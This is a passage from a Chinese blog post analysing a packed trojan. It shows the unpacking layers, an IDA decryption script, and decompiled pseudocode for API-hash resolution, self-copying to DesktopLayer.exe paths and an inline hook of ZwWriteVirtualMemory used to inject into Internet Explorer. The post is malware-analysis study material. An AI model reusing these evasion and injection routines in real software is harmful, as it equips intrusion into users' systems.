@@ -1,0 +1,910 @@
+<!DOCTYPE html>
+<html lang="zh-CN"
+  dir="ltr">
+
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+
+
+
+<link rel="icon" type="image/ico" href="https://lich4.github.io//favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://lich4.github.io//favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://lich4.github.io//favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="192x192" href="https://lich4.github.io//android-chrome-192x192.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://lich4.github.io//apple-touch-icon.png">
+
+<meta name="description" content=""/>
+
+<title>
+    
+    记一次木马分析 | 超哥的博客
+    
+</title>
+
+<link rel="canonical" href="https://lich4.github.io/win_posts/20150103_trojan_analysis/"/>
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/assets/combined.min.cbcb816aefdb3b7380c5921cbb3b89d12f07742cb3f869754adb56da84f0d729.css" media="all">
+
+
+
+
+
+
+
+
+
+  </head>
+
+  
+
+  
+  
+  
+
+  <body class="light">
+
+    <div class="content">
+      <header>
+        
+
+<div class="header">
+
+    
+
+</div>
+
+      </header>
+
+      <main class="main">
+        
+
+
+
+
+
+<div class="breadcrumbs">
+    
+    <a href="/">Home</a>
+    <span class="breadcrumbs-separator"> > </span>
+    
+    <a href="/win_posts/">Win_posts</a>
+    <span class="breadcrumbs-separator"> > </span>
+    
+    <a class="breadcrumbs-current" href="/win_posts/20150103_trojan_analysis/">记一次木马分析</a>
+</div>
+
+
+
+<div >
+
+  <div class="single-intro-container">
+
+    
+
+    <h1 class="single-title">记一次木马分析</h1>
+    
+    <p class="single-summary">记一次木马分析</p>
+    
+
+    
+
+    <p class="single-readtime">
+      
+      
+      
+      <time datetime="2015-01-03T00:00:00&#43;00:00">January 3, 2015</time>
+      
+
+      
+    </p>
+
+  </div>
+
+  
+
+  
+  
+
+  <div class="single-tags">
+    
+    <span>
+      <a href="https://lich4.github.io/tags/%E9%80%86%E5%90%91/">#逆向</a>
+    </span>
+    
+    
+  </div>
+
+  
+  
+
+  
+
+  
+  <aside class="toc">
+    <p><strong>Table of contents</strong></p>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#准备工作">准备工作</a></li>
+    <li><a href="#解密第一层">解密第一层</a></li>
+    <li><a href="#解密第二层">解密第二层</a></li>
+    <li><a href="#解密第三层">解密第三层</a></li>
+    <li><a href="#内嵌pe">内嵌PE</a></li>
+  </ul>
+</nav>
+  </aside>
+  
+
+  
+
+  <div class="single-content">
+    <h2 id="准备工作">准备工作</h2>
+<p>  从txt中把16进制数据拷贝到WinHex，生成55k的exe文件，看pe节名发现upx壳，直接用upx脱壳机，得到82k的exe文件，目前为止能看到的pe节：</p>
+<pre tabindex="0"><code>.code  00401000 0040A000 R . X . L para 0001 public CODE 32 0000 0000 0002 FFFFFFFF FFFFFFFF
+.data  0040A000 00414000 R . . . L para 0002 public DATA 32 0000 0000 0002 FFFFFFFF FFFFFFFF
+.rdata 00414000 00416000 R . . . L para 0003 public DATA 32 0000 0000 0002 FFFFFFFF FFFFFFFF
+</code></pre><h2 id="解密第一层">解密第一层</h2>
+<p>  IDA分析的所有函数都没有意义的空函数，主要混淆形式有：</p>
+<ul>
+<li>任意用无效参数调用api（因此导入表也基本是无用的），甚至存在检测errorcode是否对应目标错误值逻辑<br>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src=" /img/trojan1.png">
+    </div>
+
+    
+</figure></li>
+<li>任意构造函数调用<br>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src=" /img/trojan2.png">
+    </div>
+
+    
+</figure></li>
+<li>入口函数start无返回(这里有玄机)<br>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src=" /img/trojan3.png">
+    </div>
+
+    
+</figure></li>
+<li>最后一个有效函数是sub_40724D这里，后面为无效数据(其实为真正代码经过加密了)<br>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src=" /img/trojan4.png">
+    </div>
+
+    
+</figure></li>
+</ul>
+<p>  整个代码只有j_VirtualAlloc的参数调用有意义的，返回分配的0xf000字节内存地址(假定0x230000)，每个函数调用最后会有jmp，要从jmp跟下去<br>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src=" /img/trojan5.png">
+    </div>
+
+    
+</figure></p>
+<p>  上图中0x2CA9是相对于VirtualAlloc分配地址的偏移，其实是第一次解密结果的入口处(假定0x232CA9)，下图是对这段内存(假定0x230000~0x23f000)的解密，而使用的源数据恰好是无法正常反汇编的主函数那里(图3 的0x401F46，在执行call sub_4083E2的时候入栈)，要跟踪新eip走向可以直接下内存断点<br>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src=" /img/trojan6.png">
+    </div>
+
+    
+</figure></p>
+<p>  这里对(0x230000,0x23f000)的内存做解密操作，因此在ida中增加一个Segment(0x230000~0x23f000)来模拟，使用脚本解密：</p>
+<pre tabindex="0"><code>dstaddr = 0x230000
+srcaddr = 0x401F44
+for off in range(0, 0xf000):
+    b = Byte(srcaddr + off)
+    b = b ^ 0xA2
+    b = (((b &amp; 0x3) &lt;&lt; 6) | ((b &gt;&gt; 2) &amp; 0xff)) &amp; 0xff
+    b = (b + 0x100 - 0x6C) &amp; 0xff
+PatchByte(dstaddr + off, b)
+</code></pre><p>
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src=" /img/trojan7.png">
+    </div>
+
+    
+</figure></p>
+<h2 id="解密第二层">解密第二层</h2>
+<p>  由前一步解密出的新节可以分析出以下函数：</p>
+<pre tabindex="0"><code>GetFunction        +018C
+fiximport          +04C2				
+decode             +05E8
+decode_1           +0743
+getNtdllBase       +0783			
+sub_2309AF         +09AF
+UnmapSection       +0BD6
+zeromem            +0C15
+fixreloc           +1758
+sub_2318FB         +18FB
+decode_2           +1B35
+Alloc              +1D68
+resetself          +2275
+memcpy             +22B0
+decode_0           +2454
+sub_2326F9         +26F9
+sub_2326FB         +26FB
+new_main           +2CA9
+setmemoryexecute_  +2E13
+loadimportdll      +2F2B
+setmemoryexecute   +3077
+GetFunctionFromEat +31D2
+nullsub_5          +329D
+Free               +32A0
+nullsub_4          +32E2
+</code></pre><p>来到入口点：</p>
+<div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span>ULONG <span style="color:#ec0000">__cdecl</span> <span style="color:#5f5fff">new_main</span>(<span style="color:#5f5fff">int</span> a1, <span style="color:#5f5fff">int</span> a2, <span style="color:#5f5fff">int</span> a3, <span style="color:#5f5fff">int</span> segbase)//第四个参数为之前分配的内存基址0x230000
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  v30 <span style="color:#ec0000">=</span> <span style="color:#ec0000">-</span><span style="color:#008900">1</span>;
+</span></span><span style="display:flex;"><span>  v29 <span style="color:#ec0000">=</span> <span style="color:#008900">1</span>;
+</span></span><span style="display:flex;"><span>  v17 <span style="color:#ec0000">=</span> getNtdllBase(<span style="color:#008900">0xE0605F88</span>);//分析①
+</span></span><span style="display:flex;"><span>  NtQuerySystemInformation <span style="color:#ec0000">=</span> (<span style="color:#5f5fff">void</span> (<span style="color:#ec0000">__stdcall</span> <span style="color:#ec0000">*</span>)(<span style="color:#5f5fff">int</span>, <span style="color:#5f5fff">int</span>, <span style="color:#5f5fff">int</span>, <span style="color:#5f5fff">signed</span> <span style="color:#5f5fff">int</span>, _SYSTEM_PERFORMANCE_INFORMATION <span style="color:#ec0000">*</span>, <span style="color:#5f5fff">signed</span> <span style="color:#5f5fff">int</span>))GetFunction(v17, <span style="color:#008900">0xFB145B9B</span>);//分析②
+</span></span><span style="display:flex;"><span>  NtQuerySystemInformation(v20, v21, v22, <span style="color:#008900">2</span>, <span style="color:#ec0000">&amp;</span>perfinfo, <span style="color:#008900">0x138</span>);// SYSTEM_PERFORMANCE_INFORMATION未发现实际作用
+</span></span><span style="display:flex;"><span>  result <span style="color:#ec0000">=</span> perfinfo.CopyOnWriteCount;
+</span></span><span style="display:flex;"><span>  <span style="color:#ec0000">if</span> ( (perfinfo.CopyOnWriteCount <span style="color:#ec0000">&lt;=</span> <span style="color:#008900">0x84D0</span> <span style="color:#ec0000">||</span> perfinfo.CopyOnWriteCount <span style="color:#ec0000">&gt;=</span> <span style="color:#008900">0x8534</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">&amp;&amp;</span> (perfinfo.CopyOnWriteCount <span style="color:#ec0000">&lt;=</span> <span style="color:#008900">0x8660</span> <span style="color:#ec0000">||</span> perfinfo.CopyOnWriteCount <span style="color:#ec0000">&gt;=</span> <span style="color:#008900">0x86C4</span>) )//正常情况下可以直接进
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v35 <span style="color:#ec0000">=</span> segbase;
+</span></span><span style="display:flex;"><span>    modulebase <span style="color:#ec0000">=</span> retaddr;                       //图6的0x40746D，为之前执行的最后一个call
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">do</span>
+</span></span><span style="display:flex;"><span>      modulebase <span style="color:#ec0000">=</span> (_IMAGE_DOS_HEADER <span style="color:#ec0000">*</span>)(((<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">int</span>)<span style="color:#ec0000">&amp;</span>modulebase[<span style="color:#ec0000">-</span><span style="color:#008900">1</span>].e_lfanew <span style="color:#ec0000">+</span> <span style="color:#008900">3</span>) <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">15</span> <span style="color:#ec0000">&lt;&lt;</span> <span style="color:#008900">15</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">while</span> ( modulebase<span style="color:#ec0000">-&gt;</span>e_magic <span style="color:#ec0000">!=</span> <span style="color:#ec0000">&#39;</span>ZM<span style="color:#ec0000">&#39;</span> );//找到主模块基址0x400000
+</span></span><span style="display:flex;"><span>    currentbase <span style="color:#ec0000">=</span> modulebase;
+</span></span><span style="display:flex;"><span>    v31 <span style="color:#ec0000">=</span> <span style="color:#ec0000">*</span>(WORD <span style="color:#ec0000">*</span>)((<span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>)<span style="color:#ec0000">&amp;</span>modulebase<span style="color:#ec0000">-&gt;</span>e_cs <span style="color:#ec0000">+</span> modulebase<span style="color:#ec0000">-&gt;</span>e_lfanew);
+</span></span><span style="display:flex;"><span>    v44 <span style="color:#ec0000">=</span> <span style="color:#008900">12</span>;
+</span></span><span style="display:flex;"><span>    v43 <span style="color:#ec0000">=</span> <span style="color:#008900">0x75115E4F</span>;
+</span></span><span style="display:flex;"><span>    v42 <span style="color:#ec0000">=</span> <span style="color:#008900">0xFFD1A121</span>;
+</span></span><span style="display:flex;"><span>    v41 <span style="color:#ec0000">=</span> <span style="color:#008900">0x17E</span>;
+</span></span><span style="display:flex;"><span>    size <span style="color:#ec0000">=</span> <span style="color:#008900">0x6200</span>;
+</span></span><span style="display:flex;"><span>    a3a <span style="color:#ec0000">=</span> <span style="color:#008900">0x937D</span>;
+</span></span><span style="display:flex;"><span>    v40 <span style="color:#ec0000">=</span> <span style="color:#008900">0xC3A56632</span>;
+</span></span><span style="display:flex;"><span>    imagesize <span style="color:#ec0000">=</span> <span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)((<span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>)currentbase <span style="color:#ec0000">+</span> <span style="color:#ec0000">*</span>((_DWORD <span style="color:#ec0000">*</span>)currentbase <span style="color:#ec0000">+</span> <span style="color:#008900">15</span>) <span style="color:#ec0000">+</span> <span style="color:#008900">80</span>);//获取exe模块大小
+</span></span><span style="display:flex;"><span>    setmemoryexecute_((<span style="color:#5f5fff">int</span>)modulebase, imagesize, <span style="color:#008900">64</span>, (<span style="color:#5f5fff">int</span>)<span style="color:#ec0000">&amp;</span>v27);//内存页提权：读写执行
+</span></span><span style="display:flex;"><span>    v33 <span style="color:#ec0000">=</span> (<span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>)currentbase <span style="color:#ec0000">+</span> <span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)((<span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>)currentbase <span style="color:#ec0000">+</span> <span style="color:#ec0000">*</span>((_DWORD <span style="color:#ec0000">*</span>)currentbase <span style="color:#ec0000">+</span> <span style="color:#008900">15</span>) <span style="color:#ec0000">+</span> <span style="color:#008900">40</span>);//获取入口点
+</span></span><span style="display:flex;"><span>    membase <span style="color:#ec0000">=</span> Alloc(<span style="color:#008900">0</span>, size);//分配一段内存用作解密
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">for</span> ( dataseg <span style="color:#ec0000">=</span> (<span style="color:#5f5fff">int</span>)currentbase; <span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)dataseg <span style="color:#ec0000">!=</span> <span style="color:#008900">0xDF62A7E</span>; <span style="color:#ec0000">++</span>dataseg );//获取data节基址，分析③
+</span></span><span style="display:flex;"><span>    v8 <span style="color:#ec0000">=</span> dataseg <span style="color:#ec0000">+</span> <span style="color:#008900">4</span>;
+</span></span><span style="display:flex;"><span>    decode(v8, a3a, v40);                       // 对data段解密
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> ( v44 <span style="color:#ec0000">&amp;</span> <span style="color:#008900">8</span> )
+</span></span><span style="display:flex;"><span>      a3a <span style="color:#ec0000">=</span> decode_0((<span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>)v8, a3a, v42, v41);	//第一次解密
+</span></span><span style="display:flex;"><span>    v10 <span style="color:#ec0000">=</span> decode_2((<span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>)v8, a3a, v43);			//第二次解密
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> ( v44 <span style="color:#ec0000">&amp;</span> <span style="color:#008900">4</span> )
+</span></span><span style="display:flex;"><span>      decode_1(v11, (_BYTE <span style="color:#ec0000">*</span>)membase, v10);		//第三次解密
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">else</span>
+</span></span><span style="display:flex;"><span>      memcpy((<span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>)membase, v10, a3a);
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> ( v44 <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x10</span> )		//不走这里
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      UnmapSection((<span style="color:#5f5fff">int</span>)currentbase);
+</span></span><span style="display:flex;"><span>      Free((<span style="color:#5f5fff">char</span>)currentbase, imagesize);
+</span></span><span style="display:flex;"><span>      v8 <span style="color:#ec0000">=</span> <span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)(membase <span style="color:#ec0000">+</span> <span style="color:#008900">60</span>) <span style="color:#ec0000">+</span> membase <span style="color:#ec0000">+</span> <span style="color:#008900">24</span>;
+</span></span><span style="display:flex;"><span>      imagesize <span style="color:#ec0000">=</span> <span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)(<span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)(membase <span style="color:#ec0000">+</span> <span style="color:#008900">60</span>) <span style="color:#ec0000">+</span> membase <span style="color:#ec0000">+</span> <span style="color:#008900">0x50</span>);
+</span></span><span style="display:flex;"><span>      UnmapSection(<span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)(v8 <span style="color:#ec0000">+</span> <span style="color:#008900">28</span>));
+</span></span><span style="display:flex;"><span>      Free(<span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)(v8 <span style="color:#ec0000">+</span> <span style="color:#008900">28</span>), <span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)(v8 <span style="color:#ec0000">+</span> <span style="color:#008900">56</span>));
+</span></span><span style="display:flex;"><span>      currentbase <span style="color:#ec0000">=</span> (<span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>)Alloc(<span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)(v8 <span style="color:#ec0000">+</span> <span style="color:#008900">28</span>), <span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)(v8 <span style="color:#ec0000">+</span> <span style="color:#008900">56</span>));
+</span></span><span style="display:flex;"><span>      <span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)(__readfsdword(<span style="color:#008900">48</span>) <span style="color:#ec0000">+</span> <span style="color:#008900">8</span>) <span style="color:#ec0000">=</span> currentbase;// 修改Imagebase
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    zeromem(v8, currentbase, imagesize);
+</span></span><span style="display:flex;"><span>    v9 <span style="color:#ec0000">=</span> <span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)(membase <span style="color:#ec0000">+</span> <span style="color:#008900">60</span>) <span style="color:#ec0000">+</span> membase;
+</span></span><span style="display:flex;"><span>    memcpy(currentbase, (<span style="color:#ec0000">const</span> <span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>)membase, <span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)(v9 <span style="color:#ec0000">+</span> <span style="color:#008900">0x54</span>));//还原回0x400000
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> ( v31 <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x2000</span> )
+</span></span><span style="display:flex;"><span>      <span style="color:#ec0000">*</span>(_WORD <span style="color:#ec0000">*</span>)((<span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>)currentbase <span style="color:#ec0000">+</span> <span style="color:#ec0000">*</span>((_DWORD <span style="color:#ec0000">*</span>)currentbase <span style="color:#ec0000">+</span> <span style="color:#008900">15</span>) <span style="color:#ec0000">+</span> <span style="color:#008900">22</span>) <span style="color:#ec0000">=</span> v26;
+</span></span><span style="display:flex;"><span>    v4 <span style="color:#ec0000">=</span> <span style="color:#ec0000">*</span>(_WORD <span style="color:#ec0000">*</span>)(v9 <span style="color:#ec0000">+</span> <span style="color:#008900">6</span>);
+</span></span><span style="display:flex;"><span>    v7 <span style="color:#ec0000">=</span> v9 <span style="color:#ec0000">+</span> <span style="color:#008900">248</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">while</span> ( v4 )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      v15 <span style="color:#ec0000">=</span> <span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)(v7 <span style="color:#ec0000">+</span> <span style="color:#008900">16</span>);
+</span></span><span style="display:flex;"><span>      memcpy((<span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>)currentbase <span style="color:#ec0000">+</span> <span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)(v7 <span style="color:#ec0000">+</span> <span style="color:#008900">12</span>), (<span style="color:#ec0000">const</span> <span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>)(membase <span style="color:#ec0000">+</span> <span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)(v7 <span style="color:#ec0000">+</span> <span style="color:#008900">20</span>)), v24);
+</span></span><span style="display:flex;"><span>      v7 <span style="color:#ec0000">+=</span> <span style="color:#008900">40</span>;
+</span></span><span style="display:flex;"><span>      v4 <span style="color:#ec0000">=</span> v6 <span style="color:#ec0000">-</span> <span style="color:#008900">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    Free(membase, size);
+</span></span><span style="display:flex;"><span>    v32 <span style="color:#ec0000">=</span> (<span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>)currentbase <span style="color:#ec0000">+</span> <span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)((<span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>)currentbase <span style="color:#ec0000">+</span> <span style="color:#ec0000">*</span>((_DWORD <span style="color:#ec0000">*</span>)currentbase <span style="color:#ec0000">+</span> <span style="color:#008900">15</span>) <span style="color:#ec0000">+</span> <span style="color:#008900">40</span>);
+</span></span><span style="display:flex;"><span>    v16 <span style="color:#ec0000">=</span> (<span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>)currentbase;
+</span></span><span style="display:flex;"><span>    resetself(//修改入口点
+</span></span><span style="display:flex;"><span>      (<span style="color:#5f5fff">int</span>)currentbase,//0x400000  Imagebase
+</span></span><span style="display:flex;"><span>      (<span style="color:#5f5fff">int</span>)v33,//0x42E000  old entry
+</span></span><span style="display:flex;"><span>      (<span style="color:#5f5fff">int</span>)v32,//0x411390	new entry
+</span></span><span style="display:flex;"><span>      <span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)((<span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>)currentbase <span style="color:#ec0000">+</span> <span style="color:#ec0000">*</span>((_DWORD <span style="color:#ec0000">*</span>)currentbase <span style="color:#ec0000">+</span> <span style="color:#008900">15</span>) <span style="color:#ec0000">+</span> <span style="color:#008900">80</span>));//sizeofImage
+</span></span><span style="display:flex;"><span>    fiximport((<span style="color:#5f5fff">int</span>)v16);//修复输入表
+</span></span><span style="display:flex;"><span>    v14 <span style="color:#ec0000">=</span> <span style="color:#ec0000">*</span>(_DWORD <span style="color:#ec0000">*</span>)<span style="color:#ec0000">&amp;</span>v16[<span style="color:#ec0000">*</span>((_DWORD <span style="color:#ec0000">*</span>)v16 <span style="color:#ec0000">+</span> <span style="color:#008900">15</span>) <span style="color:#ec0000">+</span> <span style="color:#008900">52</span>];
+</span></span><span style="display:flex;"><span>    fixreloc(v25, v12);//修复重定位表
+</span></span><span style="display:flex;"><span>    v13 <span style="color:#ec0000">=</span> <span style="color:#ec0000">*</span>(_WORD <span style="color:#ec0000">*</span>)((<span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>)currentbase <span style="color:#ec0000">+</span> <span style="color:#ec0000">*</span>((_DWORD <span style="color:#ec0000">*</span>)currentbase <span style="color:#ec0000">+</span> <span style="color:#008900">15</span>) <span style="color:#ec0000">+</span> <span style="color:#008900">6</span>);
+</span></span><span style="display:flex;"><span>    JUMPOUT(<span style="color:#ec0000">&amp;</span>loc_230C9A);//设置各个新节的属性
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ec0000">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>首先遇到的是getNtdllBase，该函数通过算法将模块名事先计算出一个4字节值获取peb结构，通过遍历dll链表得到指定模块基址：</li>
+</ul>
+<pre tabindex="0"><code>int __cdecl getNtdllBase(int dllsig)// dllsig这里用作匹配模块名，ntdll对应0x FB145B9Bh
+{
+  int result; // eax@0
+  int v2; // eax@2
+  WCHAR *v3; // ecx@2
+  int v4; // eax@7
+  _LDR_DATA_TABLE_ENTRY *v5; // edx@1
+  PLIST_ENTRY v6; // ebx@1
+
+  v6 = (PLIST_ENTRY)(*(_DWORD *)(__readfsdword(48) + 12) + 12);// _PEB_LDR_DATA-&gt;InLoadOrderModuleList
+  v5 = (_LDR_DATA_TABLE_ENTRY *)v6-&gt;Flink-&gt;Flink;
+  while ( (PLIST_ENTRY)v5 != v6 )
+  {
+    v3 = v5-&gt;BaseDllName.Buffer;
+    v2 = 0;
+    while ( *v3 )
+    {
+      v2 = __ROL4__(v2, 7);
+      LOBYTE(v2) = (*(_BYTE *)v3 | 0x20) ^ v2;
+      ++v3;
+    }
+    v4 = v2 ^ 0x4B50FA82;
+    if ( v4 == funcnamesig )
+      return v5-&gt;DllBase;
+    v5 = (_LDR_DATA_TABLE_ENTRY *)v5-&gt;InLoadOrderLinks.Flink;
+    result = 0;
+  }
+  return result;
+}
+</code></pre><ul>
+<li>然后遇到getFunction，该函数通过算法将函数名事先计算出一个4字节值，用作匹配DLL模块导出表从而获取函数基址</li>
+</ul>
+<pre tabindex="0"><code>FARPROC __cdecl getFunction(int base, int funcsig)//base为模块基址，目前为ntdll；funcsig用作匹配函数名，例如NtAllocateVirtualMemory对应0x42025366
+int __cdecl GetFunction(int ntdllbase, int sig)
+{
+  int v2; // ebp@0
+  return GetFunctionFromEat(v2);//直接将ebp传给该函数，因此在子函数中ebp+8为第一个参数，以此类推
+}
+
+int __usercall GetFunctionFromEat@&lt;eax&gt;(int a1@&lt;ebp&gt;)
+{
+  DWORD v1; // esi@1
+  _IMAGE_EXPORT_DIRECTORY *exportbase; // eax@1
+  int sig; // ebx@1
+
+  exportbase = (_IMAGE_EXPORT_DIRECTORY *)(*(_DWORD *)(a1 + 8)
+                                         + *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 0x3C)
+                                                     + *(_DWORD *)(a1 + 8)
+                                                     + 0x78));
+  v1 = exportbase-&gt;AddressOfNames;
+  *(_DWORD *)(a1 - 4) = exportbase-&gt;NumberOfNames;
+  sig = *(_DWORD *)(a1 + 12);
+  JUMPOUT(&amp;loc_230925);//这里本质是一个循环做匹配
+}
+</code></pre><ul>
+<li>这个0xDF62A7E标志正是data段的起始，od在新入口0x411390转储exe</li>
+</ul>
+<p>
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src=" /img/trojan8.png">
+    </div>
+
+    
+</figure>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src=" /img/trojan9.png">
+    </div>
+
+    
+</figure></p>
+<h2 id="解密第三层">解密第三层</h2>
+<p>  以上做的所有工作都是为了获取入口点，dump出来的文件带mediaplayer图标，185k，入口代码：</p>
+<pre tabindex="0"><code>void __usercall __noreturn start(int a1@&lt;eax&gt;, char *a2@&lt;edx&gt;, int a3@&lt;ecx&gt;, unsigned int a4@&lt;ebp&gt;)
+{
+//….仍然在修复导入表
+	  if ( checkbrowserexist(&#34;C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe&#34;, 0x400u) == 1 )
+	  {
+		v4 = createmutex(&#34;KyUffThOkYwRRtgPP&#34;);
+		if ( v4 )
+		{
+		  destroymutex(v4);
+		  v4 = HANDLE_FLAG_INHERIT;
+		}
+		if ( v4 == HANDLE_FLAG_INHERIT )
+		{
+		  v5 = GetModuleFileNameA(0, selffile, 0x104u);
+		  makecstring((BYTE *)selffile, v5);
+		  if ( CopyAndRunTrojan(selffile) == 1 )//传播自身到以下路径：
+	//%CommonProgramFiles%/Microsoft/DesktopLayer.exe
+	//%HOMEDRIVE%%HOMEPATH%/Microsoft/DesktopLayer.exe
+	//%APPDATA%/Microsoft/DesktopLayer.exe
+	//%SYSTEM%/Microsoft/DesktopLayer.exe
+	//%TMP%/Microsoft/DesktopLayer.exe
+//%ProgramFiles%/Microsoft/DesktopLayer.exe
+			ExitProcess(0);
+		  if ( GetNtdllFunction() == 1 )//实现获取函数地址，以便给注入到IE的木马使用
+		  {
+			hookZwWriteVirtualMemory();//这里没有直接inline hook入口点，而是跳了5条指令
+			CreateProcess((LPSTR)&#34;C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe&#34;, 1);
+//通过上下逻辑可知CreateProcess触发NtWriteVirtualMemory
+			unhookZwWriteVirtualMemory();
+		  }
+		}
+	  }
+	  ExitProcess(0);
+	}   
+
+	int __stdcall makeinlinehook(LPVOID procaddr, LPVOID hookaddr, int a4)
+{
+  if ( VirtualProtect(procaddr, 0xAu, 0x40u, &amp;flOldProtect) )
+  {
+    v3 = skipninst(procaddr, 5u);//实现了小型的汇编指令长度引擎
+    hookoff = v3;
+    dwSize = v3 + 10;
+    shell = VirtualAlloc(0, v3 + 10, 0x1000u, 0x40u);
+    if ( shell )
+    {
+      v12 = shell;
+      *(_DWORD *)shell = procaddr;
+      *((_BYTE *)shell + 4) = hookoff;
+      v5 = (int)shell + 5;
+      memcpy(procaddr, (char *)shell + 5, hookoff);
+      v6 = hookoff + v5;
+      *(_BYTE *)v6 = 0xE9u;
+      *(_DWORD *)(v6 + 1) = (_BYTE *)procaddr - (_BYTE *)v12 - 10;
+      *(_BYTE *)procaddr = 0xE9u;
+      *(_DWORD *)((char *)procaddr + 1) = (_BYTE *)hookaddr - (_BYTE *)procaddr - 5;
+      *(_DWORD *)a4 = (char *)v12 + 5;
+      VirtualProtect(v12, dwSize, flOldProtect, &amp;v10);
+      v9 = 1;
+    }
+    VirtualProtect(procaddr, 0xAu, flOldProtect, &amp;v10);
+  }
+  return v9;
+}
+</code></pre><p>  我自己做了个实验，CreateProcess也确实触发了NtWriteVirtualMemory，且目标句柄确实是IE的，所以重点在于挂钩函数的分析：</p>
+<pre tabindex="0"><code>// write access to const memory has been detected, the output may be wrong!
+__int64 __stdcall new_ZwWriteVirtualMemory(HANDLE hProcess, PVOID BaseAddress, PVOID Buffer, int NumberOfBytesToWrite, int *NumberOfBytesWritten)
+{
+  __int64 v5; // rax@1
+  char *v6; // eax@3
+  LONGLONG v7; // kr00_8@4
+  __int64 v9; // [sp-20h] [bp-28h]@1
+  SIZE_T NumberOfBytesWrittena; // [sp+0h] [bp-8h]@5
+  DWORD oldpro; // [sp+4h] [bp-4h]@5
+
